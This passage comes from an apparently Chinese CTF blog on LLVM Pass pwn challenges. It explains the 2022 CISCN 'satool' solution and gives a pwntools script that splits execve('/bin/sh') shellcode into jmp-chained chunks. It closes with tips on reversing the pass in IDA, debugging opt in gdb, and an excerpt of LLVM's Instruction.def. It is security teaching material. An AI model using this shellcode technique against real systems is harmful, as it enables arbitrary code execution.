class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">s = <span class="built_in">str</span>(i)</span><br><span class="line">s = <span class="string">&quot;0&quot;</span>*(<span class="number">3</span>-<span class="built_in">len</span>(s)) + s</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;func&quot;</span> + s + <span class="string">&quot;(0);&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="2022ciscn-satool"><a href="#2022ciscn-satool" class="headerlink" title="2022ciscn-satool"></a>2022ciscn-satool</h2><p>注册Pass叫做mba,重写的ROF函数是<code>`anonymous namespace&#39;::MBAPass::runOnFunction</code></p><p>函数真正需要关注的部分只有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mprotect(this[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">3</span>);</span><br><span class="line">`anonymous namespace<span class="number">&#x27;</span>::MBAPass::handle((_anonymous_namespace_::MBAPass *)this, v29);</span><br><span class="line">mprotect(this[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">v27 = `anonymous namespace<span class="number">&#x27;</span>::MBAPass::callCode((_anonymous_namespace_::MBAPass *)this);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::MBAPass::callCode(</span><br><span class="line">        __int64 (__fastcall **this)(_anonymous_namespace_::MBAPass *, __int64),</span><br><span class="line">        __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> this[<span class="number">4</span>]((_anonymous_namespace_::MBAPass *)this, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先将<code>this[4]</code>页置为可写可执行,执行handler函数</p><p>再将<code>this[4]</code>页置为可读可执行,执行<code>this[4]</code>处的代码</p><p>经过调试可以知道this[4]被全部初始化为c3</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_212830.png" alt=""></p><p>那么重点就是handle了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v29 = (llvm::BasicBlock *)llvm::Function::front(a2);</span><br><span class="line">Terminator = (llvm::User *)llvm::BasicBlock::getTerminator(v29);</span><br><span class="line">Operand = llvm::User::getOperand(Terminator, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)this + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  v2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);</span><br><span class="line">  SExtValue = llvm::ConstantInt::getSExtValue(v2);</span><br><span class="line">  `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeMovImm64(this, <span class="number">0</span>, SExtValue);</span><br><span class="line">  <span class="keyword">return</span> `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeRet(this);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)this + <span class="number">12</span>) = <span class="number">1</span>;</span><br><span class="line">  `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeMovImm64(this, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeRet(this);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题是倒序对基本块中的指令进行处理的，<code>getTerminator</code>函数是取末尾的指令，第一个<code>if</code>判断末尾指令的第一个操作数是否是常数，第二个<code>else if</code>判断末尾指令的第一个操作数是否为函数的参数，如果都不是，说明是变量，那就进入到最后<code>else</code>的分支。</p><p>出题人实现了四个函数用于写指令</p><ul><li>writeMovImm64 给rax或rbx立即数</li><li>writeInc <code>inc rax</code></li><li>writeOpReg <code>add rax,rbx</code></li><li>writeRet 写<code>ret</code></li></ul><p>但这些shellcode似乎并没办法能够构造完成getshell</p><p>所以这题最后利用的是反复执行RunOnFunction的时候,<u>this[4]的内容是不会被重置的</u></p><p>因为其是在构造函数中进行初始化的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall `anonymous namespace<span class="number">&#x27;</span>::MBAPass::MBAPass(<span class="type">void</span> **this)</span><br><span class="line">&#123;</span><br><span class="line">  llvm::FunctionPass::FunctionPass((llvm::FunctionPass *)this, `anonymous namespace<span class="number">&#x27;</span>::MBAPass::ID);</span><br><span class="line">  *this = (<span class="type">char</span> *)&amp;`vtable <span class="keyword">for</span><span class="number">&#x27;</span>`anonymous namespace<span class="number">&#x27;</span>::MBAPass + <span class="number">16</span>;</span><br><span class="line">  this[<span class="number">4</span>] = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(this[<span class="number">4</span>], <span class="number">195</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过分析发现，<u>一个<code>sub</code>或者<code>add</code>的<code>IR</code>对应的<code>shellcode</code>是13个字节</u>：,那么我们可以这样构造</p><p>第一次利用add rax功能在这个区域留下一些jmp指令</p><p>然后第二次输入shellcode恰好覆盖到执行jmp指令,并且在第二次输入shellcode的时候提前利用add rax功能<u>分多次布置好shellcode并使用jmp跳转指令连接</u></p><p>最后由于这题的<code>LLVM IR</code>中指令的操作符只能是<code>add</code>或<code>sub</code>，故不能用<code>C</code>语言直接编译生成<code>LLVM IR</code>文件，不然会有很多其他的操作符。</p><p><u>可以先用<code>C</code>语言写两个空函数</u>，再通过<code>clang-12</code>对其编译生成<code>ll</code>文件，<u>然后直接在<code>ll</code>文件中仿照之前的题目手写<code>LLVM IR</code></u></p><p><strong>模板脚本:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">319</span>):</span><br><span class="line">payload = <span class="string">&quot;  %&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; = add nsw i64 %&quot;</span> + <span class="built_in">str</span>(i-<span class="number">1</span>) + <span class="string">&quot;, &quot;</span> + <span class="string">&quot;1024&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p><strong>shellcode:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = [</span><br><span class="line"><span class="string">&quot;mov edi, 0x68732f6e&quot;</span>,<span class="comment">#为了长度不长于6,所以选择/bin/sh分两次写</span></span><br><span class="line"><span class="string">&quot;shl rdi, 24&quot;</span>,<span class="comment">#左移三个字节</span></span><br><span class="line"><span class="string">&quot;mov ebx, 0x69622f&quot;</span>,</span><br><span class="line"><span class="string">&quot;add rdi, rbx&quot;</span>,<span class="comment">#剩余部分,通过ebx加上</span></span><br><span class="line"><span class="string">&quot;push rdi&quot;</span>,</span><br><span class="line"><span class="string">&quot;push rsp&quot;</span>,</span><br><span class="line"><span class="string">&quot;pop rdi&quot;</span>,</span><br><span class="line"><span class="string">&quot;xor rsi, rsi&quot;</span>,</span><br><span class="line"><span class="string">&quot;xor rdx, rdx&quot;</span>,</span><br><span class="line"><span class="string">&quot;push 59&quot;</span>,</span><br><span class="line"><span class="string">&quot;pop rax&quot;</span>,</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sc <span class="keyword">in</span> shellcode:</span><br><span class="line"><span class="built_in">print</span>(u64(asm(sc).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x90&#x27;</span>) + <span class="string">b&#x27;\xEB\xEB&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(u16(<span class="string">b&#x27;\xEB\xE4&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="逆向定位"><a href="#逆向定位" class="headerlink" title="逆向定位"></a>逆向定位</h2><p>一般情况下,ctf中llvm类题目都是重写了<code>FunctionPass</code>类中的<code>runOnFunction</code>函数</p><p>那么该如何定位到重写的<code>runOnFunction</code>函数</p><p>只需要打开so文件,在ida中搜索文本<code>vtable</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000000000020DD10                               ; `vtable for&#x27;`anonymous namespace&#x27;::VMPass</span><br><span class="line">LOAD:000000000020DD10 00 00 00 00 00 00 00 00       _ZTVN12_GLOBAL__N_16VMPassE dq 0        ; offset to this</span><br><span class="line">LOAD:000000000020DD18 B0 DD 20 00 00 00 00 00       dq offset _ZTIN12_GLOBAL__N_16VMPassE   ; `typeinfo for&#x27;`anonymous namespace&#x27;::VMPass</span><br><span class="line">LOAD:000000000020DD20 80 67 00 00 00 00 00 00       off_20DD20 dq offset sub_6780           ; DATA XREF: sub_6720+30↑o</span><br><span class="line">LOAD:000000000020DD28 D0 67 00 00 00 00 00 00       dq offset sub_67D0</span><br><span class="line">LOAD:000000000020DD30 E0 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(void)</span><br><span class="line">LOAD:000000000020DD38 30 7A 00 00 00 00 00 00       dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;)</span><br><span class="line">LOAD:000000000020DD40 80 7A 00 00 00 00 00 00       dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;)</span><br><span class="line">LOAD:000000000020DD48 80 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module const*)</span><br><span class="line">LOAD:000000000020DD50 08 EB 20 00 00 00 00 00       dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,std::string const&amp;)</span><br><span class="line">LOAD:000000000020DD58 F0 EA 20 00 00 00 00 00       dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType)</span><br><span class="line">LOAD:000000000020DD60 C0 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;)</span><br><span class="line">LOAD:000000000020DD68 B0 EA 20 00 00 00 00 00       dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(void)</span><br><span class="line">LOAD:000000000020DD70 D8 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;)</span><br><span class="line">LOAD:000000000020DD78 00 EB 20 00 00 00 00 00       dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(void)</span><br><span class="line">LOAD:000000000020DD80 A0 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(void const*)</span><br><span class="line">LOAD:000000000020DD88 78 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(void)</span><br><span class="line">LOAD:000000000020DD90 C8 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(void)</span><br><span class="line">LOAD:000000000020DD98 D0 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(void)</span><br><span class="line">LOAD:000000000020DDA0 98 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)</span><br><span class="line">LOAD:000000000020DDA8 30 68 00 00 00 00 00 00       dq offset sub_6830</span><br><span class="line">LOAD:000000000020DDB0                               ; public `anonymous namespace&#x27;::VMPass</span><br></pre></td></tr></table></figure><p>一般最后一项就是重写的<code>runOnFunction</code>函数</p><p>至于<code>PASS</code>注册的名称，一般会在<code>README</code>文件中给出，若是没有给出，可通过对<code>__cxa_atexit</code>函数“交叉引用”来定位：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  sub_6510((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_20E990, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>一般调试对象都是题目给定的opt,调试的步骤一般是</p><p><code>gdb ./opt-8</code>进入调试</p><p>之后<code>set args -load ./VMPass.so -VMPass ./exp.ll</code>配置参数</p><p><code>opt</code>会在一系列初始化函数(<u>gdb调试非常明显的一大坨</u>)之后的第一个call映射so共享模块</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_110404.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff3b5d000     0x7ffff3b6b000 r-xp     e000      0 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br><span class="line">0x7ffff3b6b000     0x7ffff3d6a000 ---p   1ff000   e000 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br><span class="line">0x7ffff3d6a000     0x7ffff3d6b000 r--p     1000   d000 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br><span class="line">0x7ffff3d6b000     0x7ffff3d6c000 rw-p     1000   e000 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br></pre></td></tr></table></figure><p>在第一个地址起始处加上so中的偏移便能够下断点进行调试了</p><p><code>opt</code>是在<code>llvm::legacy::PassManager::run(llvm::Module&amp;)</code>处开始进行对<code>RunonFunction</code>的调用</p><p>然后在其内部这个位置进入<code>llvm::FPPassManager::runOnModule(llvm::Module&amp;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_111145.png" alt=""></p><p>之后便正式进入<code>llvm::FPPassManager::runOnFunction(llvm::Function&amp;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_111312.png" alt=""></p><p>最后调用重写的<code>RunOnFunction</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_111441.png" alt=""></p><h2 id="opt"><a href="#opt" class="headerlink" title="opt"></a>opt</h2><p>llvm_pass类题目其其实就是针对<code>opt</code>这个文件</p><p>利用so模块中注册的PASS类中的漏洞去pwn攻击<code>opt进程</code></p><p>opt的保护一般都是这种情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/aichch/pwn/qwb2022-yakagame/opt-8&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//===-- llvm/Instruction.def - File that describes Instructions -*- C++ -*-===//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                     The LLVM Compiler Infrastructure</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This file is distributed under the University of Illinois Open Source</span></span><br><span class="line"><span class="comment">// License. See LICENSE.TXT for details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//===----------------------------------------------------------------------===//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This file contains descriptions of the various LLVM instructions.  This is</span></span><br><span class="line"><span class="comment">// used as a central place for enumerating the different instructions and</span></span><br><span class="line"><span class="comment">// should eventually be the place to put comments about the instructions.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//===----------------------------------------------------------------------===//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> NO INCLUDE GUARD DESIRED!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Provide definitions of macros so that users of this file do not have to</span></span><br><span class="line"><span class="comment">// define everything to use it...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_TERM_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_TERM_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_TERM_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_TERM_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_UNARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_UNARY_INST(num, opcode, instclass)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_UNARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_UNARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_BINARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> 